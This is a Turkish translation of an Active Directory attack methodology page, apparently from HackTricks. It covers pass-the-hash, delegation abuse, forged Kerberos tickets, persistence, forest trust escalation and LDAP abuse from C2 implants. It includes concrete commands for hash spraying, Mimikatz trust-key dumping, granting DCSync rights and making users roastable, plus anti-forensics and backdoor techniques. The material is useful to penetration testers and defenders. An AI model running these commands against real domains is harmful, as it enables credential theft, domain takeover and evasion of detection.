[**Hash'leri elde etmenin farklı yolları hakkında bilgi edinmek için bu sayfayı okuyun.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Bir kullanıcının hash'ine sahip olduğunuzda**, bu hash'i kullanıcıyı **impersonate etmek** için kullanabilirsiniz.\
Bu **hash'i kullanarak NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir; **veya** yeni bir **sessionlogon** oluşturup bu **hash'i** **LSASS içine inject edebilirsiniz**; böylece herhangi bir **NTLM authentication gerçekleştirildiğinde**, **bu hash kullanılır.** Son seçenek mimikatz'ın yaptığıdır.\
[**Daha fazla bilgi için bu sayfayı okuyun.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bu attack, yaygın Pass The Hash over NTLM protocol'üne alternatif olarak, **kullanıcının NTLM hash'ini Kerberos ticket'ları istemek için kullanmayı** amaçlar. Bu nedenle, **NTLM protocol'ünün devre dışı bırakıldığı** ve authentication protocol'ü olarak yalnızca **Kerberos'a izin verilen** network'lerde özellikle **kullanışlı** olabilir.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT) attack** yönteminde attacker'lar, password veya hash değerleri yerine **bir kullanıcının authentication ticket'ını çalar**. Daha sonra bu çalınan ticket, **kullanıcıyı impersonate etmek** ve bir network içindeki resource'lara ve service'lere yetkisiz erişim elde etmek için kullanılır.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Bir **local administrato**r hesabının **hash'ine** veya **password'üne** sahipseniz, bu bilgilerle diğer **PC'lere yerel olarak login olmayı** denemelisiniz.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Bunun oldukça **noisy** olduğunu ve **LAPS**'in bunu **mitigate** edeceğini unutmayın.

### MSSQL Abuse & Trusted Links

Bir kullanıcı **MSSQL instances**'larına **access** ayrıcalıklarına sahipse, bunları MSSQL host'unda **commands execute** etmek (SA olarak çalışıyorsa), NetNTLM **hash**'ini **steal** etmek veya bir **relay** **attack** gerçekleştirmek için kullanabilir.\
Bir MSSQL instance'ı başka bir instance tarafından bir database link üzerinden trusted durumdaysa, linked database üzerinde ayrıcalıklara sahip bir kullanıcı **trust relationship**'ı kullanarak **other instance** üzerinde **queries execute** edebilir. Bu trust'ler birbirine zincirlenebilir ve sonunda kullanıcının commands execute edebileceği yanlış yapılandırılmış bir database'e ulaşabilir.\
**Databases arasındaki links, forest trusts genelinde bile çalışır.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Üçüncü taraf inventory ve deployment suite'leri, credentials ve code execution için sıklıkla güçlü yollar sunar. Bkz.:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) attribute'una sahip herhangi bir Computer object bulur ve computer üzerinde domain privileges'a sahip olursanız, computer'a login olan tüm users'ın memory'sinden TGT'lerini dump edebilirsiniz.\
Dolayısıyla bir **Domain Admin computer'a login olursa**, onun TGT'sini dump edebilir ve [Pass the Ticket](pass-the-ticket.md) kullanarak onu impersonate edebilirsiniz.\
Constrained delegation sayesinde bir **Print Server'ı otomatik olarak compromise** etmek bile mümkün olabilir (umarız bu bir DC olur).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Bir user veya computer "Constrained Delegation" için izinliyse, bir computer üzerindeki bazı services'a **herhangi bir user'ı impersonate ederek access** edebilir.\
Daha sonra bu user/computer'ın **hash**'ini **compromise** ederseniz, bazı services'a access etmek için **herhangi bir user'ı** (domain admins dahil) **impersonate** edebilirsiniz.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Bir remote computer'ın Active Directory object'i üzerinde **WRITE** ayrıcalığına sahip olmak, **elevated privileges** ile code execution elde edilmesini sağlar:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromise edilmiş user'ın bazı domain objects üzerinde, daha sonra **lateral move**/**escalate** privileges yapmanızı sağlayabilecek **ilginç privileges**'ları olabilir.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain içinde **Spool service listening** keşfetmek, **new credentials acquire** etmek ve **escalate privileges** yapmak için **abuse** edilebilir.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**Other users** **compromised** machine'a **access** ederse, memory'den credentials **gather** etmek ve hatta onları impersonate etmek için process'lerine beacon'lar **inject** etmek mümkündür.\
Users genellikle sisteme RDP üzerinden access eder; bu nedenle burada third party RDP sessions üzerinde birkaç attack gerçekleştirme yöntemini bulabilirsiniz:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**, domain-joined computers üzerindeki **local Administrator password**'larını yönetmek için bir sistem sağlar ve bunların **randomized**, unique ve sık sık **changed** olmasını garanti eder. Bu passwords Active Directory'de saklanır ve access, yalnızca yetkili users için ACLs aracılığıyla kontrol edilir. Bu password'lara access etmek için yeterli permissions'a sahipseniz, diğer computers'a pivot etmek mümkün hale gelir.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Compromise edilmiş machine'den **certificates gather** etmek, environment içinde privileges escalate etmenin bir yolu olabilir:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**Vulnerable templates** yapılandırılmışsa, privileges escalate etmek için bunları abuse etmek mümkündür:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

**Domain Admin** veya daha iyisi **Enterprise Admin** privileges elde ettiğinizde, **domain database**'ini: _ntds.dit_ **dump** edebilirsiniz.

[**DCSync attack hakkında daha fazla bilgiye buradan ulaşabilirsiniz**](dcsync.md).

[**NTDS.dit'ı nasıl steal edeceğiniz hakkında daha fazla bilgiye buradan ulaşabilirsiniz**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Daha önce ele alınan bazı teknikler persistence için kullanılabilir.\
Örneğin şunları yapabilirsiniz:

- Users'ı [**Kerberoast**](kerberoast.md) için vulnerable hale getirmek

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Users'ı [**ASREPRoast**](asreproast.md) için vulnerable hale getirmek

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Bir user'a [**DCSync**](#dcsync) privileges vermek

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**, belirli bir service için **NTLM hash**'ini (örneğin **PC account hash**'ini) kullanarak **legitimate Ticket Granting Service (TGS) ticket** oluşturur. Bu yöntem, **service privileges'a access** etmek için kullanılır.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bir **Golden Ticket attack**, attacker'ın Active Directory (AD) environment'ında **krbtgt account'un NTLM hash**'ine access elde etmesini içerir. Bu account özeldir; çünkü AD network'ünde authentication için gerekli olan tüm **Ticket Granting Tickets (TGTs)**'i sign etmek için kullanılır.

Attacker bu hash'i elde ettiğinde, seçtiği herhangi bir account için **TGTs** oluşturabilir (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Bunlar, **yaygın golden tickets detection mechanisms'ı bypass edecek** şekilde forge edilmiş golden tickets gibidir.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

Bir account'un **certificates**'larına sahip olmak veya bunları request edebilmek, user account'unda persistence sağlayabilmek için çok iyi bir yoldur (password'ü değiştirse bile):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates kullanarak domain içinde yüksek privileges ile persistence sağlamak da mümkündür:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory'deki **AdminSDHolder** object'i, yetkisiz değişiklikleri önlemek amacıyla **privileged groups** (Domain Admins ve Enterprise Admins gibi) genelinde standart bir **Access Control List (ACL)** uygulayarak bu grupların security'sini sağlar. Ancak bu özellik exploit edilebilir; attacker, regular user'a full access vermek için AdminSDHolder'ın ACL'sini değiştirirse bu user tüm privileged groups üzerinde kapsamlı control elde eder. Koruma amacı taşıyan bu security measure, yakından izlenmediği takdirde unwarranted access'e izin vererek ters tepebilir.

[**AdminDSHolder Group hakkında daha fazla bilgi burada.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Her **Domain Controller (DC)** içinde bir **local administrator** account'u bulunur. Böyle bir machine üzerinde admin rights elde ederek local Administrator hash'i **mimikatz** kullanılarak extract edilebilir. Bunun ardından, **bu password'ün kullanımını enable** etmek ve local Administrator account'una remote access sağlamak için registry modification gereklidir.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Bir **user**'a belirli domain objects üzerinde, user'ın gelecekte **privileges escalate** etmesini sağlayacak bazı **special permissions**'lar **give** edebilirsiniz.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors**, bir **object**'in başka bir **object** üzerindeki sahip olduğu **permissions**'ları **store** etmek için kullanılır. Bir object'in **security descriptor**'ında küçük bir değişiklik yapabilirseniz, privileged group üyesi olmanıza gerek kalmadan bu object üzerinde oldukça ilginç privileges elde edebilirsiniz.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Kısa ömürlü principals/GPOs/DNS records oluşturmak için `dynamicObject` auxiliary class'ını `entryTTL`/`msDS-Entry-Time-To-Die` ile abuse edin; bunlar tombstones bırakmadan kendilerini siler, LDAP evidence'ını yok ederken orphan SIDs, broken `gPLink` references veya cached DNS responses bırakır (ör. AdminSDHolder ACE pollution ya da malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Tüm domain accounts'a access sağlamak için **LSASS**'ı memory'de alter ederek **universal password** oluşturun.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP'nin (Security Support Provider) ne olduğunu buradan öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Machine'a access etmek için kullanılan **credentials**'ları **clear text** olarak **capture** etmek üzere **own SSP**'nizi oluşturabilirsiniz.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD içinde **new Domain Controller** register eder ve bunu specified objects üzerinde **attributes**'ları (SIDHistory, SPNs...) herhangi bir **logs** bırakmadan **push** etmek için kullanır. **DA** privileges'larına sahip olmanız ve **root domain** içinde bulunmanız gerekir.\
Yanlış data kullanırsanız oldukça kötü logs oluşacağını unutmayın.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Daha önce, **LAPS passwords**'larını okumak için **enough permission**'a sahipseniz privileges'ı nasıl escalate edeceğinizi ele almıştık. Ancak bu passwords persistence'ı **maintain** etmek için de kullanılabilir.\
Bkz.:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft, **Forest**'ı security boundary olarak görür. Bu, tek bir domain'i **compromise** etmenin potansiyel olarak tüm Forest'ın compromise edilmesine yol açabileceği anlamına gelir.<sup>[[1]](#references)</sup>

### Basic Information

Bir [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>), bir **domain**'deki user'ın başka bir **domain**'deki resources'a access etmesini sağlayan bir security mechanism'dir. Temel olarak, iki domain'in authentication systems'ı arasında bir bağlantı oluşturur ve authentication verifications'ın sorunsuz biçimde akmasını sağlar. Domain'ler bir trust oluşturduğunda, trust'ın integrity'si için kritik olan belirli **keys**'leri kendi **Domain Controllers (DCs)**'leri içinde exchange eder ve saklar.

Tipik bir senaryoda, bir user **trusted domain** içindeki bir service'a access etmek istiyorsa, önce kendi domain'inin DC'sinden **inter-realm TGT** adı verilen özel bir ticket request etmelidir. Bu TGT, iki domain'in üzerinde anlaşmaya vardığı shared bir **key** ile encrypted edilir. Ardından user, service ticket (**TGS**) almak için bu TGT'yi **trusted domain'in DC**'sine sunar. Trusted domain'in DC'si inter-realm TGT'yi başarıyla validate ettiğinde, user'a service'a access sağlayan bir TGS verir.

**Steps**:

1. **Domain 1** içindeki bir **client computer**, **NTLM hash**'ini kullanarak **Domain Controller (DC1)**'den bir **Ticket Granting Ticket (TGT)** request ederek süreci başlatır.
2. Client başarıyla authenticated edilirse DC1 yeni bir TGT issue eder.
3. Client daha sonra **Domain 2** içindeki resources'a access etmek için gereken **inter-realm TGT**'yi DC1'den request eder.
4. Inter-realm TGT, iki yönlü domain trust'ın bir parçası olarak DC1 ve DC2 arasında shared olan bir **trust key** ile encrypted edilir.
5. Client, inter-realm TGT'yi **Domain 2'nin Domain Controller'ına (DC2)** götürür.
6. DC2, shared trust key'ini kullanarak inter-realm TGT'yi verify eder ve geçerliyse client'ın access etmek istediği Domain 2 server'ı için bir **Ticket Granting Service (TGS)** issue eder.
7. Son olarak client, Domain 2'deki service'a access etmek için bu TGS'yi server'a sunar; TGS, server'ın account hash'i ile encrypted edilmiştir.

### Different trusts

Bir **trust**'ın 1 yönlü veya 2 yönlü olabileceğine dikkat etmek önemlidir. 2 yönlü seçeneklerde her iki domain de birbirine trust eder; ancak **1 yönlü** trust relation'da domain'lerden biri **trusted**, diğeri ise **trusting** domain olur. Son durumda, **trusted domain'den trusting domain içindeki resources'a access edebilirsiniz**.

Domain A, Domain B'ye trust ediyorsa A trusting domain, B ise trusted domain'dir. Ayrıca **Domain A** açısından bu bir **Outbound trust**; **Domain B** açısından ise bir **Inbound trust** olur.

**Different trusting relationships**

- **Parent-Child Trusts**: Aynı forest içinde yaygın olan bu yapılandırmada child domain, parent domain ile otomatik olarak two-way transitive trust oluşturur. Bu, authentication requests'lerin parent ve child arasında sorunsuz biçimde akabileceği anlamına gelir.
- **Cross-link Trusts**: "Shortcut trusts" olarak adlandırılan bu trust'lar, referral processes'ı hızlandırmak için child domain'ler arasında oluşturulur. Complex forests içinde authentication referrals'ın genellikle forest root'a kadar çıkıp ardından target domain'e inmesi gerekir. Cross-links oluşturularak yol kısaltılır; bu özellikle coğrafi olarak dağınık environments için yararlıdır.
- **External Trusts**: Farklı ve ilişkisiz domain'ler arasında oluşturulur ve doğaları gereği non-transitive'dir. [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)'a göre external trusts, forest trust ile bağlı olmayan current forest dışındaki bir domain'deki resources'a access etmek için kullanışlıdır. Security, external trusts ile SID filtering aracılığıyla güçlendirilir.
- **Tree-root Trusts**: Forest root domain ile yeni eklenen bir tree root arasında otomatik olarak oluşturulur. Yaygın karşılaşılmasalar da tree-root trusts, forest'a yeni domain trees eklemek için önemlidir; bu trees'lerin unique domain name korumasını ve two-way transitivity sağlamasını mümkün kılar. Daha fazla bilgi [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) içinde bulunabilir.
- **Forest Trusts**: Bu trust türü, iki forest root domain arasında two-way transitive trust'tır ve security measures'ı güçlendirmek için SID filtering'i de uygular.
- **MIT Trusts**: Windows dışı, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domain'leriyle oluşturulur. MIT trusts biraz daha özeldir ve Windows ecosystem dışındaki Kerberos-based systems ile integration gerektiren environments'a yöneliktir.

#### Other differences in **trusting relationships**

- Bir trust relationship ayrıca **transitive** (A, B'ye trust eder; B, C'ye trust eder; o halde A, C'ye trust eder) veya **non-transitive** olabilir.
- Bir trust relationship **bidirectional trust** (her ikisi de birbirine trust eder) veya **one-way trust** (yalnızca biri diğerine trust eder) olarak kurulabilir.

### Attack Path

1. Trusting relationships'ı **enumerate** edin
2. Herhangi bir **security principal**'ın (user/group/computer) **other domain** resources'ına **access** sahibi olup olmadığını kontrol edin; bu access ACE entries aracılığıyla veya other domain groups'larının üyesi olunarak elde edilmiş olabilir. **Domains arası relationships** arayın (trust muhtemelen bunun için oluşturulmuştur).
1. Bu durumda kerberoast başka bir option olabilir.
3. Domain'ler arasında **pivot** yapabilen **accounts**'ları **compromise** edin.

Attackers, başka bir domain'deki resources'a üç temel mechanism aracılığıyla access sağlayabilir:

- **Local Group Membership**: Principals, machines üzerindeki local groups'a (örneğin bir server'daki “Administrators” group'una) eklenebilir ve bu da onlara machine üzerinde önemli bir control sağlar.
- **Foreign Domain Group Membership**: Principals, foreign domain içindeki groups'ın da üyesi olabilir. Ancak bu yöntemin effectiveness'ı trust'ın nature'ına ve group'un scope'una bağlıdır.
- **Access Control Lists (ACLs)**: Principals bir **ACL** içinde, özellikle bir **DACL** içindeki **ACEs**'de entities olarak belirtilebilir ve bu şekilde belirli resources'a access sağlanabilir. ACLs, DACLs ve ACEs'in mechanics'ini daha derinlemesine incelemek isteyenler için “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” başlıklı whitepaper değerli bir kaynaktır.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Domain içindeki foreign security principals'ı bulmak için **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** kontrol edebilirsiniz. Bunlar **an external domain/forest** içindeki user/group'lardır.

Bunu **Bloodhound** içinde veya powerview kullanarak kontrol edebilirsiniz:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Domain trust'larını enumerate etmenin diğer yolları:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2 trusted keys** bulunur; biri _Child --> Parent_, diğeri _Parent_ --> _Child_ için kullanılır.\
> Mevcut domain tarafından kullanılan anahtarı şu komutlarla alabilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Trust ilişkisini SID-History injection kullanarak kötüye geçirip child/parent domain üzerinde Enterprise admin olarak yetki yükseltin:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context'in (NC) nasıl istismar edilebileceğini anlamak kritik öneme sahiptir. Configuration NC, Active Directory (AD) ortamlarında bir forest genelindeki yapılandırma verileri için merkezi bir depo görevi görür. Bu veriler forest içindeki her Domain Controller'a (DC) replike edilir ve writeable DC'ler Configuration NC'nin yazılabilir bir kopyasını tutar. Bunu istismar etmek için bir DC üzerinde **SYSTEM yetkilerine**, tercihen bir child DC üzerinde sahip olmak gerekir.

**GPO'yu root DC site'ına bağlama**

Configuration NC'nin Sites container'ı, AD forest içindeki domain'e katılmış tüm bilgisayarların siteleri hakkındaki bilgileri içerir. Saldırganlar herhangi bir DC üzerinde SYSTEM yetkileriyle çalışarak GPO'ları root DC sitelerine bağlayabilir. Bu işlem, bu sitelere uygulanan policy'leri değiştirerek root domain'i potansiyel olarak ele geçirebilir.

Ayrıntılı bilgi için [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) araştırması incelenebilir.<sup>[[12]](#references)</sup>

**Forest içindeki herhangi bir gMSA'yı ele geçirme**

Bir attack vector, domain içindeki ayrıcalıklı gMSA'ları hedeflemeyi içerir. gMSA'lerin password'lerini hesaplamak için gerekli olan KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC üzerinde SYSTEM yetkileriyle KDS Root key'e erişmek ve forest genelindeki herhangi bir gMSA için password'leri hesaplamak mümkündür.

Ayrıntılı analiz ve adım adım yönlendirme şurada bulunabilir:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Tamamlayıcı delegated MSA attack (BadSuccessor – migration attributes'ın kötüye kullanılması):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ek external araştırma: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Bu method sabır gerektirir; yeni ayrıcalıklı AD object'lerinin oluşturulması beklenir. SYSTEM yetkileriyle saldırgan, herhangi bir user'a tüm class'lar üzerinde tam control vermek için AD Schema'yı değiştirebilir. Bu durum, yeni oluşturulan AD object'lerine yetkisiz erişim ve control sağlanmasına yol açabilir.

Daha fazla bilgiye [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) üzerinden ulaşılabilir.<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability, forest içindeki herhangi bir user olarak authentication sağlayan bir certificate template oluşturmak için Public Key Infrastructure (PKI) object'leri üzerindeki control'ü hedefler. PKI object'leri Configuration NC içinde bulunduğundan, writeable bir child DC'nin ele geçirilmesi ESC5 attack'lerinin gerçekleştirilmesini sağlar.

Daha fazla ayrıntı [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) adresinde bulunabilir.<sup>[[15]](#references)</sup> ADCS'nin bulunmadığı senaryolarda saldırgan, [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) bölümünde açıklandığı gibi gerekli bileşenleri kurabilir.<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Bu senaryoda **domain'iniz**, size üzerinde **belirsiz izinler** veren harici bir domain tarafından **trusted** durumdadır. Domain'inizdeki **hangi principal'ların harici domain üzerinde hangi erişimlere sahip olduğunu** bulmanız ve ardından bunları istismar etmeye çalışmanız gerekir:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Harici Forest Domain - Tek Yönlü (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Bu senaryoda **sizin domain'iniz**, **farklı domain'lerden** bir principal'a bazı **privilege'lar** **trust** etmektedir.

Ancak bir **domain**, trusting domain tarafından **trust edildiğinde**, trusted domain **öngörülebilir bir isim** kullanan ve **trusted password'ı password olarak** belirleyen bir user **oluşturur**. Bu da, **trusting domain'deki bir user'a erişerek trusted domain'in içine girmeyi**, onu enumerate etmeyi ve daha fazla privilege escalate etmeyi mümkün kılar:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted domain'i compromise etmenin başka bir yolu, domain trust'ın **ters yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu çok yaygın değildir).

Trusted domain'i compromise etmenin başka bir yolu, **trusted domain'den bir user'ın erişebildiği** bir makinede bekleyerek **RDP** üzerinden login olmasını sağlamaktır. Ardından attacker, RDP session process'ine code inject edebilir ve buradan **victim'ın origin domain'ine erişebilir**.\
Ayrıca, **victim hard drive'ını mount ettiyse**, attacker **RDP session** process'i üzerinden **hard drive'ın startup folder'ına backdoor'lar** yerleştirebilir. Bu technique **RDPInception** olarak adlandırılır.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Forest trust'leri üzerinden SID history attribute'undan yararlanan attack'lerin riski, tüm inter-forest trust'lerde default olarak aktif olan SID Filtering ile azaltılır. Bu yaklaşım, Microsoft'un görüşüne göre security boundary olarak domain yerine forest'ın kabul edilmesi nedeniyle intra-forest trust'lerin güvenli olduğu varsayımına dayanır.
- Ancak bir sorun vardır: SID filtering, application'ları ve user access'i bozabilir; bu nedenle zaman zaman devre dışı bırakılır.

### **Selective Authentication:**

- Inter-forest trust'ler için Selective Authentication kullanılması, iki forest'taki user'ların otomatik olarak authenticate edilmemesini sağlar. Bunun yerine user'ların trusting domain veya forest içindeki domain'lere ve server'lara erişebilmesi için açık permission'lar gerekir.
- Bu önlemlerin writable Configuration Naming Context (NC)'nin exploit edilmesine veya trust account'ına yönelik attack'lere karşı koruma sağlamadığını belirtmek önemlidir.

[**ired.team'de domain trust'leri hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implant'lerden LDAP-based AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD-style LDAP primitive'lerini tamamen on-host implant (ör. Adaptix C2) içinde çalışan x64 Beacon Object File'lar olarak yeniden uygular. Operator'lar pack'i `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` ile compile eder, `ldap.axs` dosyasını load eder ve ardından beacon'dan `ldap <subcommand>` çağırır. Tüm traffic, LDAP (389) üzerinden mevcut logon security context'i ile signing/sealing kullanılarak veya auto certificate trust özellikli LDAPS (636) üzerinden iletilir; bu nedenle socks proxy'lerine veya disk artifact'larına gerek yoktur.<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` ve `get-groupmembers`, kısa isimleri/OU path'lerini full DN'lere resolve eder ve ilgili object'leri dump eder.
- `get-object`, `get-attribute` ve `get-domaininfo`, security descriptor'lar dahil olmak üzere arbitrary attribute'ları ve `rootDSE` üzerinden forest/domain metadata'sını çeker.
- `get-uac`, `get-spn`, `get-delegation` ve `get-rbcd`, roasting candidate'lerini, delegation setting'lerini ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptor'larını doğrudan LDAP üzerinden gösterir.
- `get-acl` ve `get-writable --detailed`, trustee'leri, right'ları (GenericAll/WriteDACL/WriteOwner/attribute write'ları) ve inheritance'ı listelemek için DACL'ı parse eder ve ACL privilege escalation için hemen kullanılabilecek target'lar sağlar.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Yetki yükseltme ve kalıcılık için LDAP write primitives

- Object creation BOF'ları (`add-user`, `add-computer`, `add-group`, `add-ou`), OU rights bulunan her yerde operatörün yeni principal'lar veya machine account'lar hazırlamasını sağlar. `add-groupmember`, `set-password`, `add-attribute` ve `set-attribute`, write-property rights bulunduğunda hedefleri doğrudan ele geçirir.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` ve `add-dcsync` gibi ACL odaklı komutlar, herhangi bir AD object üzerindeki WriteDACL/WriteOwner yetkisini PowerShell/ADSI artifact'leri bırakmadan password reset, group membership control veya DCSync replication privileges'a dönüştürür. `remove-*` karşılıkları eklenen ACE'leri temizler.

### Delegation, roasting ve Kerberos abuse

- `add-spn`/`set-spn`, ele geçirilmiş bir user'ı anında Kerberoastable hale getirir; `add-asreproastable` (UAC toggle), password'a dokunmadan user'ı AS-REP roasting için işaretler.
- Delegation macro'ları (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`), beacon üzerinden `msDS-AllowedToDelegateTo`, UAC flags veya `msDS-AllowedToActOnBehalfOfOtherIdentity` değerlerini yeniden yazarak constrained/unconstrained/RBCD attack path'lerini etkinleştirir ve remote PowerShell veya RSAT gereksinimini ortadan kaldırır.

### sidHistory injection, OU relocation ve attack surface shaping

- `add-sidhistory`, kontrollü bir principal'ın SID history'sine privileged SID'ler inject eder (bkz. [SID-History Injection](sid-history-injection.md)); tamamen LDAP/LDAPS üzerinden stealthy access inheritance sağlar.
- `move-object`, computer veya user'ların DN/OU değerini değiştirir; böylece attacker, `set-password`, `add-groupmember` veya `add-spn` abuse edilmeden önce asset'leri delegated rights'ın zaten bulunduğu OU'lara taşıyabilir.
- Sıkı kapsamlı removal command'ları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` vb.), operatör credential veya persistence elde ettikten sonra hızlı rollback yapılmasını sağlayarak telemetry'yi en aza indirir.

## AD -> Azure & Azure -> AD


{{#ref}}
